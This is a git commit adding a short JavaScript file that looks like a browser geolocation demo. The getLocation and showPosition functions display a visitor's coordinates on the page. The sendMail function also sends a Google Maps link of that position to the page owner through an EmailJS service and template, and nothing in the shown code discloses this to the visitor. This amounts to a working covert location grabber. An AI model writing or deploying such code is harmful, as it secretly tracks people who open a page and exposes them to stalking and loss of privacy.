5d0cdccaa0cc4e2fccaad72e308727c1e410dbc1
george-postolache <73037857+george-postolache@users.noreply.github.com>
2025-03-10 22:07:21 +0200

    Create scripts.js

---
+++ scripts.js
@@ -0,0 +1,34 @@
+
+/* Place your JavaScript in this file */
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    sendMail(position.coords.latitude, position.coords.longitude);
+    console.log(position.coords.latitude+', '+position.coords.longitude)
+  x.innerHTML = "Latitude: " + position.coords.latitude + 
+  "<br>Longitude: " + position.coords.longitude;
+}
+
+function sendMail(lat, long) {
+  var templateParams = {
+    name: 'James',
+    messages: 'https://maps.google.com/maps?q='+lat+','+long,
+  };
+
+  emailjs.send('service_dkfcjxp', 'template_w7ocdql', templateParams).then(
+    (response) => {
+      console.log('SUCCESS!', response.status, response.text);
+    },
+    (error) => {
+      console.log('FAILED...', error);
+    },
+  );
+}
